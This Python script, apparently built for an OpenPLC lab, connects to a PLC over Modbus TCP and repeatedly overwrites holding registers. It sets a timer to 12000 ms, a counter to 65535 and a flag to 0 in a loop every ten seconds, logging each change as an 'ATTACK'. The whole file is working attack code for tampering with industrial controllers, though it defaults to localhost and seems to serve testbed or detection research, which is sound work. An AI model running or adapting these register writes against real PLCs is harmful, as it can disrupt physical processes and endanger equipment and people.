"""Simulated Modbus attacks against OpenPLC."""
import time
from datetime import datetime

from pymodbus.client import ModbusTcpClient


def _log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")


def _connect(ip, port=502):
    c = ModbusTcpClient(ip, port=port)
    c.connect()
    if not c.connected:
        raise ConnectionError(f"Cannot reach PLC at {ip}:{port}")
    return c


def _read(c, addr):
    return c.read_holding_registers(address=addr, count=1).registers[0]


def _write(c, addr, value):
    old = _read(c, addr)
    c.write_register(address=addr, value=value)
    time.sleep(0.15)
    new = _read(c, addr)
    return old, new


def attack_timer(c, addr=1, value=12000):
    old, new = _write(c, addr, value)
    _log(f"ATTACK timer: MW{addr} {old} -> {new} ms")


def attack_counter(c, addr=3, value=65535):
    old, new = _write(c, addr, value)
    _log(f"ATTACK counter: MW{addr} {old} -> {new}")


def attack_flag(c, addr=0, value=0):
    old, new = _write(c, addr, value)
    _log(f"ATTACK flag: MW{addr} {old} -> {new}")


def run_attacks(ip, interval=10, rounds=None, scenarios=None):
    """Run attacks in a loop every `interval` seconds."""
    scenarios = scenarios or ["timer", "counter", "flag"]
    _log(f"Attack loop starting against {ip}, interval={interval}s")
    n = 0
    while rounds is None or n < rounds:
        n += 1
        _log(f"--- round {n} ---")
        c = _connect(ip)
        try:
            if "timer"   in scenarios: attack_timer(c)
            if "counter" in scenarios: attack_counter(c)
            if "flag"    in scenarios: attack_flag(c)
        finally:
            c.close()
        if rounds is None or n < rounds:
            _log(f"sleeping {interval}s")
            time.sleep(interval)


if __name__ == "__main__":
    run_attacks("127.0.0.1", interval=10)